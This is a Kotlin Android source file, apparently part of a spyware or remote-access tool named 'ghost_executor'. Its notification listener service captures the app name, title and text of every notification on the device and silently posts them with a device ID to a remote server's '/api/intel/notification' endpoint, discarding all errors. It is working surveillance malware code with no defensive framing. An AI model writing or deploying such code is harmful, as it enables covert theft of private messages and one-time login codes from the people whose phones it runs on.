package com.example.ghost_executor

import android.app.Notification
import android.content.Intent
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject
import java.net.URL

class NotificationService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        // CEK FLAG BLOCK
        if (GhostService.isBlockingNotifications) return // Jangan kirim jika di block

        val packageName = sbn.packageName
        val extras: Bundle = sbn.notification.extras
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "No Title"
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "No Text"
        
        Thread {
            try {
                val prefs = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
                val deviceId = prefs.getString("flutter.device_id", null)
                val server = prefs.getString("flutter.server_url", null)
                if (deviceId != null && server != null) {
                    val json = JSONObject().put("pkg", packageName).put("title", title).put("text", text).put("time", System.currentTimeMillis())
                    sendPost("$server/api/intel/notification", "deviceId=$deviceId&data=$json")
                }
            } catch (e: Exception) {}
        }.start()
    }

    private fun sendPost(urlStr: String, params: String) {
        try { val url = URL(urlStr); val conn = url.openConnection() as java.net.HttpURLConnection; conn.requestMethod = "POST"; conn.doOutput = true; conn.outputStream.write(params.toByteArray()); conn.inputStream.close() } catch (e: Exception) {}
    }
}